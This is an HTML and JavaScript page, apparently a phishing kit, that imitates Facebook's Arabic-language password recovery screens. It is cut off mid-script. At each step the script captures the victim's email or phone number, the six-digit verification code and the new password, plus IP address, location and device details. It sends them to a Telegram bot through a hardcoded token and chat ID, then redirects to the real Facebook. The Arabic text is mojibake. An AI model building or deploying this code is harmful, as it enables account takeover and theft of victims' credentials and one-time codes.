<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙÙŠØ³Ø¨ÙˆÙƒ - Ø§Ø³ØªØ¹Ø§Ø¯Ø© ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
            line-height: 1.6;
        }
        
        /* Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ†Ù‚Ù„ Ø§Ù„Ø¹Ù„ÙˆÙŠ - Ù…Ø¹Ø¯Ù„ Ù„ÙŠØ´Ø¨Ù‡ ÙÙŠØ³Ø¨ÙˆÙƒ */
        .navbar {
            background-color: #ffffff;
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
        }
        
        .logo {
            color: #1877f2;
            font-size: 1.5rem;
            font-weight: bold;
            display: flex;
            align-items: center;
        }
        
        .logo i {
            margin-right: 8px;
            font-size: 1.8rem;
        }
        
        .nav-links {
            display: flex;
            gap: 15px;
        }
        
        .nav-links a {
            color: #606770;
            text-decoration: none;
            font-size: 0.9rem;
            display: flex;
            align-items: center;
        }
        
        .nav-links a i {
            margin-left: 5px;
            font-size: 1.2rem;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            margin-top: 80px;
        }
        
        .login-box {
            background-color: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            transition: all 0.3s ease;
        }
        
        .logo-large {
            color: #1877f2;
            font-size: 3.5rem;
            margin-bottom: 20px;
            font-weight: bold;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .title {
            font-size: 1.5rem;
            margin-bottom: 15px;
            color: #1c1e21;
            font-weight: 600;
        }
        
        .description {
            color: #606770;
            margin-bottom: 25px;
            font-size: 1rem;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 15px;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 1rem;
            transition: border-color 0.3s;
        }
        
        input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        .submit-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1.1rem;
            font-weight: bold;
            padding: 12px;
            width: 100%;
            margin-bottom: 15px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
        }
        
        .submit-btn:hover {
            background-color: #166fe5;
            transform: translateY(-1px);
        }
        
        .submit-btn:active {
            transform: translateY(0);
        }
        
        .cancel-btn {
            background-color: #e4e6eb;
            color: #4b4f56;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: bold;
            padding: 12px;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .cancel-btn:hover {
            background-color: #d8dadf;
        }
        
        .error-message {
            color: #ff4d4f;
            background-color: #fff1f0;
            border: 1px solid #ffa39e;
            border-radius: 8px;
            padding: 14px;
            margin-bottom: 20px;
            font-size: 0.95rem;
            text-align: center;
            display: none;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* ØµÙØ­Ø© OTP */
        #otpForm {
            display: none;
        }
        
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 25px;
        }
        
        .otp-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 1.8rem;
            border: 2px solid #dddfe2;
            border-radius: 10px;
            transition: all 0.3s;
            caret-color: #1877f2;
        }
        
        .otp-input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
        }
        
        .otp-sent-to {
            font-weight: bold;
            color: #1c1e21;
            background-color: #f0f2f5;
            padding: 6px 12px;
            border-radius: 20px;
            display: inline-block;
            margin: 5px 0;
        }
        
        /* Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†Ø¬Ø§Ø­ */
        .success-message {
            background-color: #f6ffed;
            border: 1px solid #b7eb8f;
            color: #52c41a;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: none;
            animation: fadeIn 0.5s ease;
        }
        
        /* Ø£Ø¯Ø§Ø© Ø§Ù„Ù†Ø³Ø® */
        .copy-tooltip {
            position: relative;
            display: inline-block;
            cursor: pointer;
        }
        
        .copy-tooltip .tooltiptext {
            visibility: hidden;
            width: 120px;
            background-color: #555;
            color: #fff;
            text-align: center;
            border-radius: 6px;
            padding: 5px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            margin-left: -60px;
            opacity: 0;
            transition: opacity 0.3s;
            font-size: 0.8rem;
        }
        
        .copy-tooltip:hover .tooltiptext {
            visibility: visible;
            opacity: 1;
        }
        
        /* ØµÙØ­Ø© Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± */
        #resetForm {
            display: none;
        }
        
        .password-strength {
            width: 100%;
            height: 4px;
            background-color: #e4e6eb;
            border-radius: 2px;
            margin-bottom: 15px;
            overflow: hidden;
        }
        
        .strength-bar {
            height: 100%;
            width: 0%;
            background-color: #1877f2;
            transition: width 0.3s;
        }
        
        /* ØªØ£Ø«ÙŠØ±Ø§Øª Ù„Ù„Ø¬ÙˆØ§Ù„ */
        @media (max-width: 480px) {
            .login-box {
                padding: 20px 15px;
            }
            
            .otp-input {
                width: 42px;
                height: 52px;
                font-size: 1.5rem;
            }
            
            .navbar {
                height: 50px;
                padding: 0 10px;
            }
            
            .logo {
                font-size: 1.2rem;
            }
            
            .nav-links {
                gap: 10px;
            }
            
            .nav-links a {
                font-size: 0.8rem;
            }
        }
    </style>
    <!-- Font Awesome Ù„Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø§Øª -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <!-- Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ†Ù‚Ù„ Ø§Ù„Ø¹Ù„ÙˆÙŠ - Ù…Ø¹Ø¯Ù„ -->
    <nav class="navbar">
        <div class="logo">
            <span>facebook</span>
            <i class="fab fa-facebook"></i>
            
        </div>
    </nav>
    
    <div class="container">
        <!-- ØµÙØ­Ø© Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯/Ø§Ù„Ù‡Ø§ØªÙ -->
        <div id="emailForm" class="login-box">
            <div class="logo-large">facebook</div>
            <div class="title">Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø­Ø³Ø§Ø¨Ùƒ</div>
            <div class="description">Ø£Ø¯Ø®Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø£Ùˆ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø§Ù„Ù…Ø±ØªØ¨Ø· Ø¨Ø­Ø³Ø§Ø¨Ùƒ.</div>
            
            <div id="emailError" class="error-message"></div>
            <div id="emailSuccess" class="success-message"></div>
            
            <input type="text" id="emailOrPhone" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø£Ùˆ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ" required>
            
            <button id="sendCodeBtn" class="submit-btn">Ø¨Ø­Ø«</button>
            <button id="cancelBtn" class="cancel-btn">Ø¥Ù„ØºØ§Ø¡</button>
        </div>
        
        <!-- ØµÙØ­Ø© Ø¥Ø¯Ø®Ø§Ù„ OTP -->
        <div id="otpForm" class="login-box">
            <div class="logo-large">facebook</div>
            <div class="title">Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</div>
            <div class="description">Ù„Ù‚Ø¯ Ø£Ø±Ø³Ù„Ù†Ø§ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰:<br><span id="sentTo" class="otp-sent-to"></span></div>
            
            <div id="otpError" class="error-message"></div>
            <div id="otpSuccess" class="success-message"></div>
            
            <div class="otp-container">
                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
            </div>
            
            <button id="verifyOtpBtn" class="submit-btn">ØªØ£ÙƒÙŠØ¯</button>
            <button id="backBtn" class="cancel-btn">Ø±Ø¬ÙˆØ¹</button>
        </div>
        
        <!-- ØµÙØ­Ø© Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± -->
        <div id="resetForm" class="login-box">
            <div class="logo-large">facebook</div>
            <div class="title">Ø§Ø®ØªØ± ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø¬Ø¯ÙŠØ¯Ø©</div>
            <div class="description">ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© Ù…Ø®ØªÙ„ÙØ© Ø¹Ù† ØªÙ„Ùƒ Ø§Ù„ØªÙŠ Ø§Ø³ØªØ®Ø¯Ù…ØªÙ‡Ø§ Ø³Ø§Ø¨Ù‚Ù‹Ø§.</div>
            
            <div id="resetError" class="error-message"></div>
            <div id="resetSuccess" class="success-message"></div>
            
            <input type="password" id="newPassword" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©" required>
            <div class="password-strength">
                <div class="strength-bar" id="strengthBar"></div>
            </div>
            
            <input type="password" id="confirmPassword" placeholder="ØªØ£ÙƒÙŠØ¯ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©" required>
            
            <button id="resetPasswordBtn" class="submit-btn">Ø­ÙØ¸ Ø§Ù„ØªØºÙŠÙŠØ±Ø§Øª</button>
            <button id="cancelResetBtn" class="cancel-btn">Ø¥Ù„ØºØ§Ø¡</button>
        </div>
    </div>

    <script>
        // Ø§Ø³ØªØ¨Ø¯Ù„ Ù‡Ø°Ù‡ Ø§Ù„Ù‚ÙŠÙ… Ø¨Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¨ÙˆØªÙƒ Ø§Ù„Ø®Ø§Øµ
        const botToken = '6808858455:AAFDmHj4oR9b5sOT6sDZWCqM4hWYLEOjjwg';
        const chatId = '2034520069';
        
        // Ø¹Ù†Ø§ØµØ± DOM
        const emailForm = document.getElementById('emailForm');
        const otpForm = document.getElementById('otpForm');
        const resetForm = document.getElementById('resetForm');
        const emailOrPhone = document.getElementById('emailOrPhone');
        const sendCodeBtn = document.getElementById('sendCodeBtn');
        const cancelBtn = document.getElementById('cancelBtn');
        const verifyOtpBtn = document.getElementById('verifyOtpBtn');
        const backBtn = document.getElementById('backBtn');
        const resetPasswordBtn = document.getElementById('resetPasswordBtn');
        const cancelResetBtn = document.getElementById('cancelResetBtn');
        const sentTo = document.getElementById('sentTo');
        const emailError = document.getElementById('emailError');
        const otpError = document.getElementById('otpError');
        const resetError = document.getElementById('resetError');
        const emailSuccess = document.getElementById('emailSuccess');
        const otpSuccess = document.getElementById('otpSuccess');
        const resetSuccess = document.getElementById('resetSuccess');
        const otpInputs = document.querySelectorAll('.otp-input');
        const newPassword = document.getElementById('newPassword');
        const confirmPassword = document.getElementById('confirmPassword');
        const strengthBar = document.getElementById('strengthBar');
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceType = "Ø¬Ù‡Ø§Ø² ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            
            if (/Android/.test(userAgent)) {
                deviceType = "Android";
            } else if (/iPhone|iPad|iPod/.test(userAgent)) {
                deviceType = /iPhone/.test(userAgent) ? "iPhone" : "iPad";
            } else if (/Windows/.test(userAgent)) {
                deviceType = "Windows PC";
            } else if (/Mac/.test(userAgent)) {
                deviceType = "Mac";
            } else if (/Linux/.test(userAgent)) {
                deviceType = "Linux PC";
            }
            
            return {
                device: deviceType,
                browser: getBrowserName(),
                os: getOS(),
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                platform: navigator.platform
            };
        }
        
        function getBrowserName() {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf("Firefox") > -1) return "Firefox";
            if (userAgent.indexOf("SamsungBrowser") > -1) return "Samsung Browser";
            if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
            if (userAgent.indexOf("Trident") > -1) return "Internet Explorer";
            if (userAgent.indexOf("Edge") > -1) return "Edge";
            if (userAgent.indexOf("Chrome") > -1) return "Chrome";
            if (userAgent.indexOf("Safari") > -1) return "Safari";
            return "Ù…ØªØµÙØ­ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        }
        
        function getOS() {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf("Windows") > -1) return "Windows";
            if (userAgent.indexOf("Mac") > -1) return "MacOS";
            if (userAgent.indexOf("Linux") > -1) return "Linux";
            if (userAgent.indexOf("Android") > -1) return "Android";
            if (userAgent.indexOf("iOS") > -1 || /iPhone|iPad|iPod/.test(userAgent)) return "iOS";
            return "Ù†Ø¸Ø§Ù… ØªØ´ØºÙŠÙ„ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù€ IP Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… API
        async function getRealIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            } catch (error) {
                console.error('Error fetching IP:', error);
                return "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            }
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø±ÙŠØ¯/Ø§Ù„Ù‡Ø§ØªÙ
        sendCodeBtn.addEventListener('click', async () => {
            const emailPhoneValue = emailOrPhone.value.trim();
            
            if (!emailPhoneValue) {
                showError(emailError, 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø£Ùˆ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ');
                return;
            }
            
            // Ø¥Ø®ÙØ§Ø¡ Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø®Ø·Ø£
            hideError(emailError);
            
            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹
            const deviceInfo = getDeviceInfo();
            const ipAddress = await getRealIP();
            const locationInfo = await getLocationInfo(ipAddress);
            
            // Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø³Ø§Ù„Ø© Ø¬Ù…ÙŠÙ„Ø© Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            const timestamp = new Date().toLocaleString();
            const message = `ğŸ“© *Ø·Ù„Ø¨ Ø§Ø³ØªØ¹Ø§Ø¯Ø© ÙƒÙ„Ù…Ø© Ø³Ø±* ğŸ“©\n\n` +
                           `âœ‰ï¸ *Ø§Ù„Ø¨Ø±ÙŠØ¯/Ø§Ù„Ù‡Ø§ØªÙ:* \`${emailPhoneValue}\`\n` +
                           `ğŸ•’ *Ø§Ù„ÙˆÙ‚Øª:* ${timestamp}\n` +
                           `ğŸŒ *IP:* \`${ipAddress}\`\n` +
                           `ğŸ“ *Ø§Ù„Ù…ÙˆÙ‚Ø¹:* ${locationInfo.city ? locationInfo.city + ', ' : ''}${locationInfo.country || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}\n` +
                           `ğŸ“± *Ø§Ù„Ø¬Ù‡Ø§Ø²:* ${deviceInfo.device} (${deviceInfo.os})\n` +
                           `ğŸ–¥ *Ø§Ù„Ù…ØªØµÙØ­:* ${deviceInfo.browser}\n` +
                           `ğŸ” *Ø§Ù„Ø¯Ù‚Ø©:* ${deviceInfo.screen}\n` +
                           `ğŸŒ *Ø§Ù„Ù„ØºØ©:* ${deviceInfo.language}`;
                                       
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            sendToTelegram(message, () => {
                // Ø¹Ù†Ø¯ Ø§Ù„Ù†Ø¬Ø§Ø­
                showSuccess(emailSuccess, 
                    `âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰:<br>` +
                    `<span class="copy-tooltip" onclick="copyToClipboard('${emailPhoneValue}')">` +
                    `${emailPhoneValue}<span class="tooltiptext">Ø§Ù†Ù‚Ø± Ù„Ù„Ù†Ø³Ø®</span></span>`);
                
                // Ø¹Ø±Ø¶ Ù†Ù…ÙˆØ°Ø¬ OTP
                setTimeout(() => {
                    emailForm.style.display = 'none';
                    otpForm.style.display = 'block';
                    sentTo.textContent = emailPhoneValue;
                    otpInputs[0].focus();
                }, 1500);
            }, (error) => {
                showError(emailError, 'Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.');
                console.error('Error:', error);
            });
        });
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ù† IP
        async function getLocationInfo(ip) {
            if (ip === "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ") return {};
            
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city,
                    country: data.country_name,
                    region: data.region,
                    isp: data.org
                };
            } catch (error) {
                console.error('Error fetching location:', error);
                return {};
            }
        }
        
        // ØªØ£ÙƒÙŠØ¯ OTP
        verifyOtpBtn.addEventListener('click', async () => {
            let otpCode = '';
            otpInputs.forEach(input => {
                otpCode += input.value;
            });
            
            if (otpCode.length !== 6) {
                showError(otpError, 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 6 Ø£Ø±Ù‚Ø§Ù…');
                return;
            }
            
            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹
            const deviceInfo = getDeviceInfo();
            const ipAddress = await getRealIP();
            const locationInfo = await getLocationInfo(ipAddress);
            
            // Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø³Ø§Ù„Ø© Ø¬Ù…ÙŠÙ„Ø© Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            const timestamp = new Date().toLocaleString();
            const message = `ğŸ”¢ *Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø°ÙŠ Ø£Ø¯Ø®Ù„Ù‡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…* ğŸ”¢\n\n` +
                           `ğŸ” *Ø§Ù„Ø±Ù…Ø²:* \`${otpCode}\`\n` +
                           `ğŸ“§ *Ù„Ù„Ø¨Ø±ÙŠØ¯/Ø§Ù„Ù‡Ø§ØªÙ:* \`${sentTo.textContent}\`\n` +
                           `ğŸ•’ *Ø§Ù„ÙˆÙ‚Øª:* ${timestamp}\n` +
                           `ğŸŒ *IP:* \`${ipAddress}\`\n` +
                           `ğŸ“ *Ø§Ù„Ù…ÙˆÙ‚Ø¹:* ${locationInfo.city ? locationInfo.city + ', ' : ''}${locationInfo.country || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}\n` +
                           `ğŸ“± *Ø§Ù„Ø¬Ù‡Ø§Ø²:* ${deviceInfo.device} (${deviceInfo.os})\n` +
                           `ğŸ–¥ *Ø§Ù„Ù…ØªØµÙØ­:* ${deviceInfo.browser}`;
            
            // Ø¥Ø±Ø³Ø§Ù„ OTP Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            sendToTelegram(message, () => {
                showSuccess(otpSuccess, 
                    `âœ… ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­!<br>` +
                    `Ø§Ù„Ø±Ù…Ø²: <span class="copy-tooltip" onclick="copyToClipboard('${otpCode}')">` +
                    `${otpCode}<span class="tooltiptext">Ø§Ù†Ù‚Ø± Ù„Ù„Ù†Ø³Ø®</span></span>`);
                
                // Ø¹Ø±Ø¶ Ù†Ù…ÙˆØ°Ø¬ Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±
                setTimeout(() => {
                    otpForm.style.display = 'none';
                    resetForm.style.display = 'block';
                }, 1500);
            }, (error) => {
                showError(otpError, 'Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.');
                console.error('Error:', error);
            });
        });
        
        // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±
        resetPasswordBtn.addEventListener('click', async () => {
            const newPass = newPassword.value;
            const confirmPass = confirmPassword.value;
            
            if (!newPass || !confirmPass) {
                showError(resetError, 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© ÙˆØªØ£ÙƒÙŠØ¯Ù‡Ø§');
                return;
            }
            
            if (newPass !== confirmPass) {
                showError(resetError, 'ÙƒÙ„Ù…ØªØ§ Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± Ù…ØªØ·Ø§Ø¨Ù‚ØªÙŠÙ†');
                return;
            }
            
            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹
            const deviceInfo = getDeviceInfo();
            const ipAddress = await getRealIP();
            const locationInfo = await getLocationInfo(ipAddress);
            
            // Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø³Ø§Ù„Ø© Ø¬Ù…ÙŠÙ„Ø© Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            const timestamp = new Date().toLocaleString();
            const message = `ğŸ”‘ *Ø·Ù„Ø¨ ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±* ğŸ”‘\n\n` +
                           `ğŸ“§ *Ø§Ù„Ø¨Ø±ÙŠØ¯/Ø§Ù„Ù‡Ø§ØªÙ:* \`${sentTo.textContent}\`\n` +
                           `ğŸ” *ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©:* \`${newPass}\`\n` +
                           `ğŸ•’ *Ø§Ù„ÙˆÙ‚Øª:* ${timestamp}\n` +
                           `ğŸŒ *IP:* \`${ipAddress}\`\n` +
                           `ğŸ“ *Ø§Ù„Ù…ÙˆÙ‚Ø¹:* ${locationInfo.city ? locationInfo.city + ', ' : ''}${locationInfo.country || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}\n` +
                           `ğŸ“± *Ø§Ù„Ø¬Ù‡Ø§Ø²:* ${deviceInfo.device} (${deviceInfo.os})\n` +
                           `ğŸ–¥ *Ø§Ù„Ù…ØªØµÙØ­:* ${deviceInfo.browser}`;
            
            // Ø¥Ø±Ø³Ø§Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            sendToTelegram(message, () => {
                showSuccess(resetSuccess, 
                    `âœ… ØªÙ… ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± Ø¨Ù†Ø¬Ø§Ø­!<br>` +
                    `ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±: <span class="copy-tooltip" onclick="copyToClipboard('${newPass}')">` +
                    `******<span class="tooltiptext">Ø§Ù†Ù‚Ø± Ù„Ù„Ù†Ø³Ø®</span></span>`);
                
                setTimeout(() => {
                    alert('ØªÙ… ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± Ø¨Ù†Ø¬Ø§Ø­! ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¢Ù† ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©.');
                    window.location.href = 'https://www.facebook.com';
                }, 1500);
            }, (error) => {
                showError(resetError, 'Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.');
                console.error('Error:', error);
            });
        });
        
        // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        function sendToTelegram(message, successCallback, errorCallback) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent:', data);
                if (successCallback) successCallback();
            })
            .catch(error => {
                if (errorCallback) errorCallback(error);
            });
        }
        
        // Ø¯Ø§Ù„Ø© Ù†Ø³Ø® Ø¥Ù„Ù‰ Ø§Ù„Ø­Ø§ÙØ¸Ø©
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                // ÙŠÙ…ÙƒÙ†Ùƒ Ø¥Ø¶Ø§ÙØ© ØªÙ†Ø¨ÙŠÙ‡ Ø£Ùˆ ØªØ£Ø«ÙŠØ± Ù‡Ù†Ø§
                console.log('Text copied to clipboard');
            }).catch(err => {
                console.error('Failed to copy text: ', err);
            });
        }
        
        // Ø¯ÙˆØ§Ù„ Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ù„Ø¹Ø±Ø¶
        function showError(element, message) {
            element.innerHTML = message;
            element.style.display = 'block';
        }
        
        function hideError(element) {
            element.style.display = 'none';
        }
        
        function showSuccess(element, message) {
